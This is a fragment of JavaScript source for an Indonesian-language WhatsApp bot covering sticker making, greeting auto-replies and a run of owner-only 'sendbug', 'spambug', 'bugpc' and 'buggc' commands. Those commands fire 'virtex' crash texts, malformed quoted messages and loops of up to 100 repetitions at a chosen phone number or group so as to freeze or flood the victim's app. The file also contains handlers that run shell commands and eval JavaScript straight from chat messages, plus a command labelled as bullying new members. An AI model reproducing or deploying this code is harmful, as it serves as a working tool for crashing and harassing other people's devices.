await xdev.sendMessage(from,{sticker: nah},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
if(err){ return}
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.jpg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./ACTION/PLICE/STICKER/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(`./${rand1}`)
await fs.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else if (isVideo || isQuotedVideo) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 1, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await xdev.sendMessage(from,{sticker: nah},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(stok)
await fs.unlinkSync(media)
} catch (err){
var stream = await downloadContentFromMessage(dev.message.imageMessage || dev.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./ACTION/PLICE/STICKER/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
await xdev.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
await fs.unlinkSync(`./${rand1}`)
await s.unlinkSync(`./${rand2}`)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
}
} else {
setReply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
}
break
case 'sendbugv1':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
await setReply("Sending...")
await xdev.sendKatalog(input, virtex8, virtex8, thumb, {quoted: setQuoted})
const bugreact = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
xdev.sendMessage(input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv2':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
await setReply("Sending...")
await xdev.sendMessage(input, { text: virtexbytsukasa }, {quoted: setQuoted})                
await xdev.sendMessage(input, { text: virtex1 }, {quoted: bugfc})            
await xdev.sendMessage(input, { text: virtex2 }, {quoted: bugfc})       
await xdev.sendMessage(input, { text: virtex3 }, {quoted: bugfc})    
await xdev.sendMessage(input, { text: virtex4 }, {quoted: bugfc})              
await xdev.sendMessage(input, { text: virtex5 }, {quoted: bugfc})     
await xdev.sendMessage(input, { text: virtex6 }, {quoted: bugfc})
await xdev.sendMessage(input, { text: virtex7 }, {quoted: bugfc})   
await xdev.sendMessage(input, { text: virtex8 }, {quoted: bugfc})            
await xdev.sendMessage(input, { text: virtex9 }, {quoted: bugfc})       
await xdev.sendMessage(input, { text: virtex10 }, {quoted: bugfc})
await xdev.sendMessage(input, { text: virtex11 }, {quoted: bugfc})              
await xdev.sendMessage(input, { text: virtex12 }, {quoted: bugfc})     
await xdev.sendMessage(input, { text: philip }, {quoted: bugfc})
await xdev.sendMessage(input, { text: slayer }, {quoted: bugfc}) 
await xdev.sendMessage(input, { text: ngazap }, {quoted: bugfc})
await xdev.sendMessage(input, { text: ngazapv1 }, {quoted: bugfc})
await xdev.sendMessage(input, { text: ngazapv2 }, {quoted: bugfc})
await xdev.sendMessage(input, { text: ngazapv3 }, {quoted: bugfc})
setReply(`Berhasil mengirim Bug ke Nomer ${input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv3':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
let vag = `${virtex8}`
let vak = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
xdev.sendButLoc(input, vag,fake,zreply,vak)
const bugreact = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
xdev.sendMessage(input, { text: "awowkwkwk" }, { quoted: bugreact });
setReply(`Berhasil mengirim Bug ke Nomer ${input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'sendbugv4':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
for (let i = 0; i < 100; i++) {
await sleep(2000)
console.log("sending")
await xdev.sendKatalog(input, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
await xdev.sendMessage(input, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(input, { text: "awowkwkwk" }, { quoted: bugkon });
}
setReply(`Berhasil mengirim Bug ke Nomer ${input.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break      
case 'sendbugv5':
try{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugv = q 
console.log(bugv)
if (!bugv) return setReply("Masukan nomer target")
if (bugv == Ownerin) return setReply("SendBug Gagal")
await setReply(`Sending bug, waktu selesai 20 detik`)
let a = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
for (let i = 0; i < 10; i++) {
await sleep(2000)
console.log("sending")
await xdev.sendMessage(bugv, { text: "awowkwkwk" }, { quoted: a });
await xdev.sendMessage(bugv, { text: "awowkwkwk" }, { quoted: bugkon });
}
setReply(`Berhasil mengirim Bug ke Nomer ${bugv.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
case 'spambugv1':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
{
setReply('*Loading...*')
await xdev.sendMessage(from, { text: virtexbytsukasa },{ quoted: bugquoted })                 
await xdev.sendMessage(from, { text: virtex1 },{ quoted: bugquoted })             
await xdev.sendMessage(from, { text: virtex2 },{ quoted: bugquoted })        
await xdev.sendMessage(from, { text: virtex3 },{ quoted: bugquoted })     
await xdev.sendMessage(from, { text: virtex4 },{ quoted: bugquoted })               
await xdev.sendMessage(from, { text: virtex5 },{ quoted: bugquoted })      
await xdev.sendMessage(from, { text: virtex6 },{ quoted: bugquoted }) 
await xdev.sendMessage(from, { text: virtex7 },{ quoted: bugquoted })    
await xdev.sendMessage(from, { text: virtex8 },{ quoted: bugquoted })             
await xdev.sendMessage(from, { text: virtex9 },{ quoted: bugquoted })        
await xdev.sendMessage(from, { text: virtex10 },{ quoted: bugquoted })     
await xdev.sendMessage(from, { text: virtex11 },{ quoted: bugquoted })               
await xdev.sendMessage(from, { text: virtex12 },{ quoted: bugquoted })      
await xdev.sendMessage(from, { text: philip },{ quoted: bugquoted }) 
await xdev.sendMessage(from, { text: slayer },{ quoted: bugquoted })  
await xdev.sendMessage(from, { text: ngazap },{ quoted: bugquoted }) 
await xdev.sendMessage(from, { text: ngazapv1 },{ quoted: bugquoted }) 
await xdev.sendMessage(from, { text: ngazapv2 },{ quoted: bugquoted }) 
await xdev.sendMessage(from, { text: ngazapv3 },{ quoted: bugquoted }) 
}
break
case 'spambugv2': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Teks?`)
setReply('*Loading...*')
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex1}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex2}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex3}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex4}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex5}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex6}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex7}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex8}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex10}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex11}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${virtex12}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv1}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv2}`}}, text: q },{ quoted: bugquoted }) 
xdev.sendMessage(from, { contextInfo: { externalAdReply:{title: `${virtex8}`,body:`${virtex8}`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`https://wa.me/${senderNumber}?text=${ngazapv3}`}}, text: q },{ quoted: bugquoted }) 
break
case 'spambuv3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
await xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc });
break
case 'bugpc': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!input ) return setReply("Masukan nomer target")
if (input == Ownerin) return setReply("Tidak bisa, karena itu nomer developer")
const bugreact = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
jumlah = args[1]
for (let i = 0; i < jumlah; i++) {
xdev.sendMessage(input, { text: virtex8 }, { quoted: bugquoted})
xdev.sendMessage(input, { text: virtex8 }, { quoted: bugfc})
xdev.sendMessage(input, { text: virtex8 }, { quoted: bugkon})
xdev.sendMessage(input, { text: virtex8 }, { quoted: bugreact})
}
setReply(`Success`)
}
break
case 'buggc': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isGroup) return onlyGroup() 
const bugreact = await xdev.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
jumlah = args[1]
for (let i = 0; i < jumlah; i++) {
xdev.sendMessage(from, { text: virtex8 }, { quoted: bugquoted})
xdev.sendMessage(from, { text: virtex8 }, { quoted: bugfc})
xdev.sendMessage(from, { text: virtex8 }, { quoted: bugkon})
xdev.sendMessage(from, { text: virtex8 }, { quoted: bugreact})
}
setReply(`Success`)
}
break
case 'bugfc':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isGroup) return onlyGroup() 
ydd = `Jiahkkkkk`
xdev.sendMessage(from, {text:ydd},{quoted: { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `Kok Fc Bang`, 
"jpegThumbnail": thumb
}
}
}})
break
//================================================================================\\
default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
if (mentionByReply) {
xdev.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${mentionByReply} ${args[0]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else if(args[1] && args[0]){
xdev.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${args[0]} ${args[1]}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
} else {
xdev.sendButMessage(from, `Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`, fake, [{buttonId: `${prefix+matches.bestMatch.target.toLowerCase()} ${q}`, buttonText: { displayText: `${matches.bestMatch.target.toLowerCase()}`},type: 1}],setQuoted);
}
} 
} //Akhir switch command





if (isImage && autoSticker) {
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (dev.msg || dev).mimetype || ''
if (/image/.test(mime)) {
let img = await xdev.downloadAndSaveMediaMessage(quoted)
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
if (sticBuffer) await xdev.sendMessage(from, { sticker: sticBuffer }, {
quoted: setQuoted,
mimetype: 'image/webp',
ephemeralExpiration: 86400
})
}
}
    
//Jika ada yg kirim pesan "p" botz akan respon
if (salam.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
if (isOwner) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){ 
sendvn(ucapbot)
} else if(autoSticker) {
sendSticker(ucapsalam)
} else {
setReply("Ucap salam napah")
}
}
//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(walaikumsalam)
} else if(autoSticker) {
sendSticker(kumsalam)
} else {
setReply("Walaikumsalam kak")
}
}
				

				
//Jika ada yg toxic botz akan merespon✓
if (!isOwner && bad.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(astaga)
} else if(autoSticker) {
await sendSticker(katakasar)
} else {
await setReply("Jangan Toxic Kak")
}
}



//Jika ada yg sange botz akan merespon✓
if (!isOwner && dosa.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(sangeya)
} else if(autoSticker) {
await sendSticker(istigfar)
} else {
await setReply("Astagfirloh oni chan")
}
}


//Jika ada yg bilang hallo maka botz akan merespon✓
if (katahai.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) return sendvn(moshimos)
}

//Jika ada yang bilang ohayo bot akan merespon✓
if(ohayo.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '11:00' && timeWib <= '23:50')  return setReply("Sekarang udah ga pagi kak")
if(autovn === true) return sendvn(oahyo)
setReply(`${ucapanWaktu} kak 🙂`)
}
				     
 //Jika ada yang bilang oyasumi malem bot akan merespon✓
if(katamalem.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if (timeWib >= '06:00' && timeWib <= '17:00')  return setReply("Sekarang udah ga malem kak")
if(autovn) {
sendvn(oyasumi)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
         
 //Jika ada yang bilang koniciwa malem bot akan merespon✓
if(katasiang.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn) {
sendvn(koniciwa)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}

//Jika ada yg bilang bot maka botz akan merespon✓
if (badud.includes(messagesC)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn ) {
sendvn(ucapbot)
} else {
setReply(hayuk)
}
}          
 //Jika ada yang bilang lopyu bot akan merespon✓
if(katalopyou.includes(messagesC)){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autovn){
sendvn(lopyoutoo)
} else {
setReply("??")
}
}
				

                   
//Jika ada yang tag nomer owner
if (!isOwner && budy.includes(nomerOwner)) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉','*Tunggu aja kak, entar juga di bales* 😁','*Iya kak, ada apa tag owner aku nih* 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
					
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
if (budy.includes(kasih) || selectedButton == 'Thanks' ) {
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
if(autoSticker) return sendSticker(samasama)
setReply(`Sama sama kak ${pushname}`)
}
}

//Ketika ada yang minta save
if(!isGroup && budy.startsWith("sv")){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Pahami dan baca peraturan bot,\nBot tidak menerima save nomer")
}

if (body.startsWith('$')){
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${fake}:~ ${err}`)
if (stdout) {
await setReply(`_${stdout}_`)
setReply("_Executing Finished_")
}
})
}

if (body.startsWith('>')){
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await setReply(evaled)
} catch (err) {
await setReply(String(err))
}
}


if (body.startsWith('=>')){
function Return(sul) {
let sat = JSON.stringify(sul, null, 2)
if(sat){
var bang = util.format(sat)
} else if (sat == undefined) {
var  bang = util.format(sul)
}
return setReply(bang)
}
try {
setReply(util.format(eval(`(async () => { return ${q} })()`)))
} catch (e) {
setReply(String(e))
}
}

if (body.startsWith('+>')){
try {
return setReply(`OutPut: 
${JSON.stringify(eval(budy.slice(2)),null,'\t')}
`)
} catch(err) {
e = String(err)
setReply(`"err" :  "${e}"`)
}
}


//Bullying member bamru
if (body.startsWith(`${prefix}bullyukk`)){
setReply(`Hayuk ah`)
xdev.sendButMessage(from, `Enaknya di apain nih 🤭`, `${fake}`, [
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully1}` },type: 1},
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully2}` },type: 1},
{buttonId: `FFFFFF`, buttonText: { displayText: `di ${bully3}` },type: 1}]);
}

if (body.startsWith(`${prefix}welcome`)){
setReply(`Welcome Kak ${sender.split("@")[0]}

Jangan Lupa Intro Y

NAMA:
UMUR:
KELAS:
HOBI:
KESUKAAN:
JENIS KELAMIN:
GOLONGAN DARAH:
NAMA IBU:
NAMA BAPAK:
NAMA KAKEK:
NAMA NENEK:
NAMA BUYUT PEREMPUAN:
NAMA BUYUT LAKI LAKI:
NAMA SAUDARA PEREMPUAN:
NAMA SAUDARA LAKI LAKI:
NAMA SEPUPU PEREMPUAN:
NAMA SEPUPU LAKI LAKI:
NAMA KAKAK:
NAMA ADEK:
NAMA BIBI:
NAMA PAMAN:
TWITTER:
FACEBOOK:
LIKE:
TIKTOK:
INSTAGRAM:
SESTYC:
PICSART:
SNAPCHAT:
TINDER:
AKTE KELAHIRAN:
KK:
KTP:
SIM:
STNK:
BPJS:
IJAZAH:
SERTIFIKAT TANAH:
SERTIFIKAT RUMAH:
FOTOCOPY IDENTITAS DIRI:
SURAT KETERANGAN KESEHATAN DARI DOKTER:
NILAI PALING TERTINGGI:
MAPEL KESUKAAN:
JALAN BERAPA LANGKAH:
LAGI APA:
UDAH MAKAN:
NILAI TERENDAH:
MAPEL PALING DIBENCI:
KULIAH :
SMA :
SMP:
SD :
TK/PAUD :
AGAMA:
FILM:
SINETRON:
ANIME:
K-DRAMA:
BIAS:
WAIFU:
HUSBU:
HUSBANDO:
LAIFU:
LAGU FAV:
MAKANAN FAV:
MINUMAN FAV:
UKURAN BAJU:
UKURAN CELANA:
UKURAN SEPATU:
UKURAN KAOS KAKI:
PANJANG TANGAN:
PANJANG KAKI:
PANJANG JARI KAKI:
PANJANG JARI TANGAN:
KARTU PELAJAR:
PASSPORT:
NAMA FREEFIRE:
NAMA PUBG:
NAMA HOTEL HIDEAWAY:
NAMA COD:
NAMA COC:
NAMA ML:
NAMA MANTAN:
JUMLAH MANTAN:
TINGGI:
BERAT BADAN:
SUKA SAMA SIAPA:
NAMA PACAR:
CALON ISTRI/SUAMI:
NAMA MERTUA:
BPKB:
KIS:
KIA:
SUHU BADAN:
PANJANG LIDAH:
OVO:
KARTU KREDIT:
KARTU MEMBER:
BCA:
BRI:
TELKOMSEL:
TRI:
KARTU MEMORI:
SMARTFREN:
PENYAKIT:
OBAT:
SIFAT:
ZODIAK:
TANGGAL LAHIR:
KITAB:
TEMPAT IBADAH:
TEMPAT WISATA:
NAMA TEMAN:
JUMLAH MURID DIKELAS:
JUMLAH ANGGOTA KELUARGA:
JUMLAH NYAMUK DIRUMAH:
JUMLAH KECOA DIRUMAH:
JUMLAH KUPU KUPU:
HEWAN KESUKAAN:
NAMA HEWAN PELIHARAAN:
ALAMAT RUMAH:
RT:
RW:
KELURAHAN:
KECAMATAN:
NAMA KOTA:
NAMA NEGARA:
KABUPATEN:
PLANET:
GALAKSI:
LANGIT:
DARATAN:
KEPULAUAN:
SAMUDRA:
LEBAR PINGGANG:
GAME FAVORIT:
CHANNEL YOUTUBE:
SIFAT:
MERK HP:
MERK MOBIL:
MERK LAPTOP:
MERK MOTOR:
JUMLAH MOBIL:
JUMLAH MOTOR:
TINGKAT RUMAH:
ALAMAT SEKOLAH:
NAMA JALAN MENUJU RUMAH:
NAMA JALAN MENUJU SEKOLAH:
ASAL:
NAMA BESTIE:
NAMA BESTFRIEND:
NAMA MUSUH:Lu
GULING ATAU BANTAL:
JUMLAH BAJU:
JUMLAH CELANA:
CITA CITA:
IMPIAN:
`) 
}

if (timeWib >= '04:00' && timeWib <= '04:10') {
console.log(color(`[ AYANG ]`), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'deeppink'))
}
if (timeWib >= '05:00' && timeWib <= '05:10') {
console.log(color(`[ AYANG ]`), color('Udah sholat Subuh belum kak', 'deeppink'))
}
if (timeWib >= '06:00' && timeWib <= '06:10') {
console.log(color(`[ AYANG ]`), color('Pagi kak, Jangan lupa mandi', 'deeppink'))
}
if (timeWib >= '11:00' && timeWib <= '11:10') {
console.log(color(`[ AYANG ]`), color('Siang kak, Dah mandi blm kak?', 'deeppink'))
}
if (timeWib >= '12:00' && timeWib <= '12:10') {
console.log(color(`[ AYANG ]`), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'deeppink'))
}
if (timeWib >= '15:00' && timeWib <= '15:10') {
console.log(color(`[ AYANG ]`), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'deeppink'))
}
if (timeWib >= '18:00' && timeWib <= '18:10') {
console.log(color(`[ AYANG ]`), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'deeppink'))
}
if (timeWib >= '19:00' && timeWib <= '19:10') {
console.log(color(`[ AYANG ]`), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'deeppink'))
}
if (timeWib >= '20:00' && timeWib <= '20:10') {
console.log(color(`[ AYANG ]`), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'deeppink'))
}
if (timeWib >= '00:00' && timeWib <= '00:10') {
console.log(color(`[ AYANG ]`), color('ngantuk kak, tidur dulu ya kak', 'deeppink'))
}


} catch (err){
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n${fake}`)    

